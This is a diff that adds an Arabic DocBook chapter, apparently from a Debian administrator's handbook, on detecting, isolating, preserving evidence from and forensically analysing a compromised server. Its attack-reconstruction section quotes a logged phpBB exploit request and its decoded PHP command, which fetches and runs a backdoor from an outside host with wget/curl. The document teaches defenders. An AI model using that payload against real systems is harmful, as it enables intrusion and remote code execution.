+      <para>يتمتع مدير النظام، ضمنياً أو صراحة، بثقة المستخدمين بالإضافة لثقة مستخدمي الشبكة بشكل عام. عليه إذن تفادي أي تقصير يمكن أن يستفيد منه الحاقدون.</para>
+
+      <para>فالمهاجم الذي يستولي على جهازك ثم يستخدمه كقاعدة انطلاق (تعرف باسم ”relay system“ أو محطة ترحيل)  ينفذ منها نشاطات خبيثة أخرى قد يسبب لك متاعب قانونية، لأن الجهة المهاجَمَة قد ترى في البداية أن الهجوم يرد من نظامك، وتعتبرك المهاجم (أو شريكاً في الجريمة). في العديد من الحالات، سيستخدم المهاجم مخدمك كمحطة لإرسال رسائل دعائية، ويجب ألا يسبب هذا ضرراً كبيراً (فيما عدا احتمال تسجيلك على قوائم سوداء قد تحد من قدرتك على إرسال رسائل مشروعة)، لكنه لن يكون ساراً أيضاً. في حالات أخرى، قد يسبب الجهاز لك مشاكل أهم، مثل هجمات denial of service. قد يسبب هذا أحياناً خسارة أرباح، بسبب توقف الخدمات المشروعة أو تدمير البيانات؛ كما قد يسبب هذا تكاليفاً حقيقية، لأن الجهة المهاجَمَة قد تتخذ إجراءات قضائية ضدك. يستطيع حاملو حقوق النشر مقاضاتك لمشاركة النسخ غير المرخصة للأعمال التي يحميها قانون حقوق النشر، كما تستطيع الشركات الأخرى الملتزمة باتفاقيات مستوى الخدمة إذا اضطرت لدفع غرامات نتيجة الهجمات الصادرة عن جهازك.</para>
+
+      <para>عندما تحدث حالات مثل هذه، لن ينفعك ادعاء البراءة وحده؛ بل ستحتاج على الأقل لأدلة مقنعة تُبيّن ورود النشاطات المشبوهة على نظامك من عنوان IP معين. لن تتمكن من الحصول على أدلة كهذه إذا أهملت نصائح هذا الفصل وتركت المهاجم يحصل على إمكانية الوصول لحساب بصلاحيات مرتفعة (وبالأخص حساب الجذر) واستعماله لتغطية آثاره.</para>
+    </section>
+  </section>
+  <section id="sect.dealing-with-compromised-machine">
+    <title>التعامل مع جهاز مُختَرَق</title>
+
+    <para>بالرغم من أحسن النوايا ومهما كانت السياسة الأمنية مصممة بحذر، سيواجه مدير النظام حالة قرصنة في النهاية. يقدّم هذا القسم بعض الإرشادات عن كيفية التصرف عند مواجهة هذه الظروف المشؤومة.</para>
+    <section>
+      <title>اكتشاف وملاحظة تطفل المخترقين</title>
+
+      <para>الخطوة الأولى في مواجهة الاختراق هي اكتشاف هذا النشاط. لا يُظهِر النشاط نفسه، خصوصاً في حال غياب البنية التحتية المناسبة لمراقبة النظام.</para>
+
+      <para>لا تُكتشَف النشاطات التخريبية غالباً قبل أن تؤثر مباشرة على الخدمات المشروعة التي يستضيفها الجهاز، مثل انخفاض سرعة الاتصالات، أو عدم قدرة بعض المستخدمين على الاتصال، أو أي نوع آخر من الأعطال. عند مواجهة هذه المشاكل، يضطر مدير النظام لفحص الجهاز جيداً وتقصي العطل بحذر. هذا هو الوقت الذي يكتشف فيه عملية غير عادية، مثل عملية اسمها <literal>apache</literal> بدلاً من العملية النظامية <literal dir="ltr">/usr/sbin/apache2</literal>. إذا أردنا متابعة هذا المثال، الخطوة التالية هي ملاحظة رقم تتعريف العملية، والتحقق من <filename dir="ltr">/proc/<replaceable>pid</replaceable>/exe</filename> لمعرفة البرنامج الذي تُنفّذه هذه العملية حالياً:</para>
+
+      <screen>
+<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
+<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
+      </screen>
+
+      <para>برنامج مُثبّتٌ في <filename>/var/tmp/</filename> ويعمل كمخدم وب؟ الجهاز مُختَرَق ولا ريب.</para>
+
+      <para>هذا مثال واحد فقط، لكن هناك أمارات أخرى كثيرة يمكن أن تثير حفيظة مدير النظام:</para>
+      <itemizedlist>
+        <listitem>
+	  <para>عدم عمل أحد خيارات أمر ما؛ الإصدارة التي يدعيها البرنامج لا تطابق الإصدارة التي يُفتَرض أنها مثبتة حسب <command>dpkg</command>؛</para>
+        </listitem>
+        <listitem>
+	  <para>ترحيب من سطر الأوامر أو جلسة العمل يُظهِر أن آخر اتصال كان من مخدم غير معروف من قارة أخرى؛</para>
+        </listitem>
+        <listitem>
+	  <para>أخطاء ناجمة عن امتلاء قسم <filename>/tmp/</filename>، الذي تبيّن أنه محشو بنسخ غير قانونية للأفلام؛</para>
+        </listitem>
+        <listitem>
+	  <para>وغير ذلك.</para>
+        </listitem>
+      </itemizedlist>
+    </section>
+    <section>
+      <title>فصل المخدم عن الشبكة</title>
+
+      <para>في جميع الحالات عدا العجيبة منها، ترد الاختراقات من الشبكة، ويحتاج المهاجم لشبكة فعالة للوصول إلى أهدافه (الوصول لمعلومات سرية، مشاركة ملفات غير قانونية، إخفاء هويته عبر استخدام الجهاز كمحطة ترحيل، وغيرها). فصل الجهاز عن الشبكة سيمنع المهاجم من الوصول لهذه الأهداف، إن لم يتمكن من تحقيقها بعد.</para>
+
+      <para>قد لا يكون هذا ممكناً إذا لم يكن الوصول الفيزيائي للمخدم متاحاً. أما إذا كانت استضافة المخدم في مركز بيانات لمزود خدمة يقع في الجانب الآخر من البلاد، أو إذا لم يكن الوصول للمخدم ممكناً لأي سبب آخر، فمن الجيد عادة البدء بجمع بعض المعلومات المهمة (انظر <xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />، و<xref linkend="sect.forensic-analysis" /> و<xref linkend="sect.reconstituting-the-attack-scenario" />)، ثم عزل ذلك المخدم قدر المستطاع عبر إيقاف أكبر عدد ممكن من الخدمات (كل الخدمات عدا <command>sshd</command> عادة). لا تزال هذه الحالة غير ملائمة، لأنك لا تستطيع الجزم بأن المهاجم لا يملك صلاحيات الدخول عبر SSH كما هي حال مدير النظام؛ هذا يجعل ”تنظيف“ الأجهزة أصعب. </para>
+    </section>
+    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
+      <title>الاحتفاظ بكل ما يمكن استخدامه كدليل</title>
+
+      <para>لفهم الهجوم و (أو) اتخاذ إجراءات قانونية ضد المهاجمين يجب أخذ نسخ عن جميع العناصر المهمة؛ هذا يتضمن محتويات القرص الصلب، ولائحة بجميع العمليات الفعالة، ولائحة بجميع الاتصالات المفتوحة. يجب استخدام محتويات الذاكرة RAM أيضاً، لكنها نادراً ما تستخدم عملياً.</para>
+
+      <para>في غمرة الحدث؛ يميل مديرو النظم غالباً لتنفيذ العديد من الفحوصات على الجهاز المُختَرَق؛ هذه ليست فكرة جيدة عادة. أي أمر تنفذه يحتمل أن يمسح جزءاً من الأدلة. يجب تقليل الفحوصات إلى أقل ما يمكن (<command>netstat -tupan</command> لاتصالات الشبكة، <command>ps auxf</command> للحصول على قائمة العمليات، <command dir="ltr">ls -alR /proc/[0-9]*</command> لمزيد من المعلومات الإضافية عن البرامج الفعالة)، كما يجب كتابة كل الفحوصات التي أجريت بحذر.</para>
+
+      <sidebar>
+        <title><emphasis>تحذير</emphasis> التحليل الساخن</title>
+
+	<para>رغم أن تحليل النظام أثناء عمله مغر جداً، خصوصاً عند عدم إمكانية الوصول الفيزيائي للمخدم، إلا أن الأفضل تفادي ذلك: ببساطة أنت لا تستطيع أن تثق بالبرامج المثبتة حالياً على النظام المخرب. من الممكن جداً أن يخفي أمر <command>ps</command> مُخرّب بعض العمليات، أو أن يخفي أمر <command>ls</command> مُعدَّل بعض الملفات؛ أحياناً حتى النواة قد تكون مُخرَّبَة!</para>
+
+	<para>إذا كان هناك حاجة لإجراء تحليل ساخن كهذا، فلا بد من أخذ الحيطة واستخدام برامج سليمة موثوقة. من الطرق الجيدة لفعل هذا استخدام CD إنقاذ فيه البرامج الأصلية، أو مشاركة شبكية للقراءة فقط. على أي حال، حتى هذه الإجراءات المضادة قد لا تكفي، إذا كانت النواة نفسها تعرضت للعبث.</para>
+      </sidebar>
+
+      <para>فور حفظ العناصر ”الديناميكية“، الخطوة التالية هي تخزين صورة عن القرص الصلب. لا يمكن أخذ صورة كهذه إذا كان نظام الملفات في تغيُّر، ولذلك يجب إعاده ربطه في وضع القراءة فقط. أبسط حل في الغالب هو إيقاف المخدم قسراً (بعد تشغيل <command>sync</command>) وإعادة إقلاعه إلى قرص إنقاذ. يجب نسخ جميع الأقسام باستخدام أداة مثل <command>dd</command>؛ يمكن إرسال هذه الصور إلى مخدم آخر (ربما عبر استخدام الأداة <command>nc</command> التي تفيد كثيراً في إرسال البيانات الناتجة عن <command>dd</command> إلى جهاز آخر). هناك احتمال آخر ربما كان أبسط: فقط أخْرِج القرص من الجهاز واستبدله بآخر جديد يمكن إعادة تهيئته وتثبيت النظام عليه.</para>
+    </section>
+    <section>
+      <title>إعادة التثبيت</title>
+      <indexterm><primary>باب خلفي</primary></indexterm>
+
+      <para>يجب عدم إعادة وصل المخدم بالشبكة قبل إعادة تثبيت النظام عليه بالكامل. إذا كان الاختراق عميقاً (إذا حصل المهاجم على صلاحيات الإدارة)، فلا توجد طريقة أخرى تقريباً للتأكد من أننا تخلصنا من جميع مخلفات المهاجم (خصوصاً <emphasis>الأبواب الخلفية backdoors</emphasis>). طبعاً، يجب تطبيق آخر التحديثات الأمنية أيضاً لسد الثغرة التي استخدمها المهاجم. مثالياً، يجب أن يشير تحليل الهجوم إلى نوع الهجمة التي استخدمت، بحيث يتأكد المرء من إصلاحها حقاً؛ وإلا، فإنه لا يسع الإنسان إلا أن يأمل أن الثغرة كانت واحدة من الثغرات التي أصلحتها التحديثات. </para>
+
+      <para>إعادة تثبيت النظام على مخدم بعيد ليست عملية سهلة دوماً؛ قد تحتاج مساعدة من شركة الاستضافة، لأن بعض هذه الشركات لا توفر أنظمة مؤتمتة لإعادة تثبيت النظام. يجب الانتباه لعدم إعادة تثبيت نسخة احتياطية أُخذِت بعد حدوث الاختراق. مثالياً، يجب استعادة البيانات فقط، أما البرمجيات فيجب إعادة تثبيتها من وسائط التثبيت.</para>
+    </section>
+    <section id="sect.forensic-analysis">
+      <title>التحليل الجنائي</title>
+
+      <para>بعد استعادة الخدمة، حان الوقت لفحص صور القرص المأخوذة من النظام المخترق في سبيل فهم طريقة الهجوم. عند ربط هذه الصور بنظام الملفات، يجب الانتباه لاستخدام الخيارات <literal>ro,nodev,noexec,noatime</literal> لتفادي تعديل محتوياتها (بما في ذلك تواريخ الوصول للملفات) أو تشغيل برامج مشبوهة عن طريق الخطأ.</para>
+
+      <para>يشمل تتبع سلسلة أحداث الهجوم عادة البحث عن كل شيء تَعدَّل أو نُفِّذ:</para>
+      <itemizedlist>
+        <listitem>
+	  <para>قراءة ملفات <filename dir="ltr">.bash_history</filename> مثيرة جداً للاهتمام غالباً؛</para>
+        </listitem>
+        <listitem>
+	  <para>كذلك سرد الملفات التي أنشئت مؤخراً، أو عدّلت أو فُتِحَت؛</para>
+        </listitem>
+        <listitem>
+	  <para>يساعد الأمر <command>strings</command> في التعرف على البرامج التي ثبّتَها المخترِق، عبر استخراج السلاسل النصية من الملفات الثنائية؛</para>
+        </listitem>
+        <listitem>
+	  <para>تسمح ملفات السجلات في <filename>/var/log/</filename> غالباً بإعادة بناء تسلسل زمني للأحداث.</para>
+        </listitem>
+        <listitem>
+	  <para>كما تسمح الأدوات المتخصصة باستعادة محتويات أي ملفات محذوفة، بما فيها ملفات السجلات التي يحذفها المهاجمون غالباً.</para>
+        </listitem>
+      </itemizedlist>
+
+      <para>يمكن تسهيل بعض هذه العمليات عبر برمجيات متخصصة. تحديداً، توفر الحزمة <emphasis role="pkg">sleuthkit</emphasis> أدوات عديدة لتحليل نظام الملفات. تُسهّل الواجهة الرسومية <emphasis>Autopsy Forensic Browser</emphasis> (من الحزمة <emphasis role="pkg">autopsy</emphasis> ) استخدام هذه الأدوات.</para>
+      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
+      <indexterm><primary>The Sleuth Kit</primary></indexterm>
+    </section>
+    <section id="sect.reconstituting-the-attack-scenario">
+      <title>إعادة بناء سيناريو الهجوم</title>
+
+      <para>يجب أن تنطبق جميع العناصر التي جُمِعَت أثناء عملية التحليل مع بعضها مثل قطع أحجية تركيب الصور؛ غالباً ما يترافق إنشاء أولى الملفات المشبوهة مع سجلات تُثْبت عملية الاختراق. يجب أن تكون الأمثلة الحقيقية أفصح من اللغو النظري.</para>
+
+      <para>السجل التالي هو جزء من سجل <filename>access.log</filename> التابع لأباتشي:</para>
+
+      <programlisting>
+www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+      </programlisting>
+
+      <para>هذا المثال ناتج عن استغلال ثغرة أمنية قديمة في phpBB. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>
+
+      <para>عبر فك تشفير عنوان URL الطويل هذا سنفهم أن المهاجم قد تمكن من تنفيذ كود PHP التالي: <command dir="ltr">system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. وبالفعل، لقد عثرنا على ملف <filename>bd</filename> في <filename>/tmp/</filename>. يعيد لنا تنفيذ <command>strings /mnt/tmp/bd</command> مجموعة سلاسل، منها <literal dir="ltr">PsychoPhobia Backdoor is starting...</literal>. يبدو أنه باب خلفي فعلاً.</para>
+
+      <para>في وقت لاحق، استُخدِمَت هذه الصلاحيات لتنزيل وتثبيت وتشغيل <emphasis>بوت</emphasis> IRC يتصل بشبكة IRC سرية (underground). يمكن بعدها التحكم بالبوت عبر هذا البروتوكول وأمره بتنزيل ملفات للمشاركة. بل إن هناك سجل خاص بهذا البرنامج:</para>
+
+      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
+** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
+** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
+** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
+** 2004-11-29-19:50:20: DCC CHAT Correct password
+(...)
+** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
+(...)
+** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
+(...)
+** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
+(...)
+** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)
+</programlisting>
+
+      <para>تُظهِر هذه الأمثلة تخزين ملفي فيديو على المخدم بوساطة العنوان 82.50.72.202.</para>
+
+      <para>على التوازي، عمد المهاجم إلى تنزيل زوج من الملفات الإضافية، <filename dir="ltr">/tmp/pt</filename> و <filename dir="ltr">/tmp/loginx</filename> تمرير هذين الملفين على <command>strings</command> يعطي سلاسل مثل <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> و <foreignphrase dir="ltr">Now wait for suid shell...</foreignphrase>. يبدوان وكأنهما برنامجين لاستغلال الثغرات المحلية للحصول على الصلاحيات الإدارية. لكن هل حققا هدفهما؟ في هذه الحالة، غالباً لم يصلا، لأنه لا يبدو أن هناك ملفات عُدّلت بعد الاختراق الأولي.</para>
+
+      <para>في هذا المثال، أعدنا بناء عملية التطفل كاملة، ويمكن أن نستنتج أن المهاجم تمكن من الاستفادة من النظام المخترق لحوالي ثلاثة أيام؛ لكن أهم عنصر في هذا التحليل هو أننا قد تعرفنا على الثغرة، ويستطيع مدير النظام أن يضمن أن الثغرة قد أُصلحَت فعلاً في التثبيت الجديد.</para>
+    </section>
+  </section>
+</chapter>
